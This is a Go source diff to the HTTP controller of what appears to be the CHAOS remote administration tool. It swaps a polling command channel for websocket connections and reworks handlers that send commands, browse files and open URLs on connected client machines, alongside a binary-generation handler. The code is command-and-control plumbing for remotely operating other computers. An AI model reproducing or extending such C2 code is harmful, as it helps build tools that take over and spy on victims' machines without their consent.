@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"github.com/gin-gonic/gin"
 	"github.com/gin-gonic/gin/binding"
+	"github.com/gorilla/websocket"
 	"github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/entities"
 	"github.com/tiagorlampert/CHAOS/internal"
@@ -15,7 +16,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	"github.com/tiagorlampert/CHAOS/services/client"
-	"github.com/tiagorlampert/CHAOS/services/payload"
 	"github.com/tiagorlampert/CHAOS/services/user"
 	"net/http"
 	"net/url"
@@ -24,6 +24,11 @@ import (
 	"strings"
 	"time"
 )
+
+var upgrader = websocket.Upgrader{
+	ReadBufferSize:  1024,
+	WriteBufferSize: 1024,
+}
 
 func (h *httpController) noRouteHandler(c *gin.Context) {
 	c.Redirect(http.StatusMovedPermanently, "/")
@@ -169,48 +174,25 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 		return
 	}
 
-	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
+	clientID, err := utils.DecodeBase64(form.Address)
+	if err != nil {
+		c.String(http.StatusBadRequest, err.Error())
+		return
+	}
+
+	ctxWithTimeout, cancel := context.WithTimeout(c, 10*time.Second)
 	defer cancel()
 
 	output, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
-		MacAddress: form.Address,
-		Request:    form.Command,
+		ClientID:  clientID,
+		Command:   form.Command,
+		Parameter: form.Parameter,
 	})
 	if err != nil {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
 	}
 	c.String(http.StatusOK, output.Response)
-}
-
-func (h *httpController) getCommandHandler(c *gin.Context) {
-	address := c.Query("address")
-	addr, err := utils.DecodeBase64(address)
-	if err != nil {
-		c.String(http.StatusBadRequest, err.Error())
-		return
-	}
-	req, found := h.PayloadService.Get(addr)
-	if found {
-		c.JSON(http.StatusOK, req)
-		return
-	}
-	c.Status(http.StatusNoContent)
-	return
-}
-
-func (h *httpController) respondCommandHandler(c *gin.Context) {
-	var body request.RespondCommandRequestBody
-	if err := c.BindJSON(&body); err != nil {
-		c.String(http.StatusBadRequest, err.Error())
-		return
-	}
-	h.PayloadService.Set(body.MacAddress, &payload.Data{
-		Response:    body.Response,
-		HasError:    body.HasError,
-		HasResponse: true,
-	})
-	c.Status(http.StatusOK)
 }
 
 func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
@@ -314,8 +296,9 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 	defer cancel()
 
 	explore, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
-		MacAddress: req.Address,
-		Request:    fmt.Sprint("explore ", path),
+		ClientID:  address,
+		Command:   "explore",
+		Parameter: path,
 	})
 	if err != nil {
 		c.HTML(http.StatusOK, "explorer.html", gin.H{"error": fmt.Sprintf("Error: %s", err.Error())})
@@ -354,10 +337,35 @@ func (h *httpController) openUrlHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	if err := h.UrlService.OpenUrl(c.Request.Context(), req.Address, req.URL); err != nil {
+	address, err := utils.DecodeBase64(req.Address)
+	if err != nil {
+		c.String(http.StatusBadRequest, err.Error())
+		return
+	}
+	if err := h.UrlService.OpenUrl(c.Request.Context(), address, req.URL); err != nil {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
 	}
 	c.Status(http.StatusOK)
 	return
+}
+
+func (h *httpController) clientHandler(c *gin.Context) {
+	clientID := c.GetHeader("x-client")
+
+	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
+	if err != nil {
+		h.Logger.Println("error connecting client:", err)
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	err = h.ClientService.AddConnection(clientID, ws)
+	if err != nil {
+		h.Logger.Println("error adding client:", err)
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	h.Logger.Println("Client connected: ", clientID)
 }
